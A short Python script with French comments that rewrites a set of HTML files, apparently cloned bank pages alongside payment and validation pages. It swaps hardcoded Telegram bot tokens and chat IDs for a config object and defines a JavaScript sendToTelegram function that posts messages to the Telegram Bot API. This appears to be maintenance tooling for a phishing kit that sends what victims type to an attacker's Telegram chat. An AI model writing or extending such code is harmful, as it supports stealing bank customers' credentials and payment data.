import os
import re

html_files = [f for f in os.listdir('.') if f.endswith('.html')]

# Script JS à ajouter après la balise <body> si pas présent
telegram_send_js = '''    <script>
        function sendToTelegram(message) {
            if (!window.telegramConfig || !window.telegramConfig.BOT_TOKEN || !window.telegramConfig.CHAT_ID) {
                console.warn("Telegram config not loaded");
                return;
            }
            
            fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: window.telegramConfig.CHAT_ID,
                    text: message
                })
            }).catch(e => console.log('Telegram send error:', e));
        }
    </script>'''

for filename in sorted(html_files):
    if filename.startswith('test-') or filename in ['confirmation.html', 'index.html', 'payment.html', 'validation.html']:
        continue  # Skip non-bank pages
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Replace hardcoded tokens and Chat IDs with window.telegramConfig calls
        # Pattern 1: Replace fetch calls with hardcoded token
        content = re.sub(
            r"fetch\(\s*['\"]https://api\.telegram\.org/bot[^/]*/sendMessage['\"]",
            "fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage'",
            content
        )
        
        # Pattern 2: Replace hardcoded chat_id values
        content = re.sub(
            r"chat_id:\s*['\"]?\d+['\"]?",
            "chat_id: window.telegramConfig.CHAT_ID",
            content
        )
        
        # Pattern 3: Replace [REDACTED] or any placeholder token in URL
        content = re.sub(
            r"bot\[REDACTED\]",
            "bot' + window.telegramConfig.BOT_TOKEN + '",
            content
        )
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"OK: {filename}")
    except Exception as e:
        print(f"ERROR: {filename}: {e}")

print("\nAll hardcoded tokens replaced!")
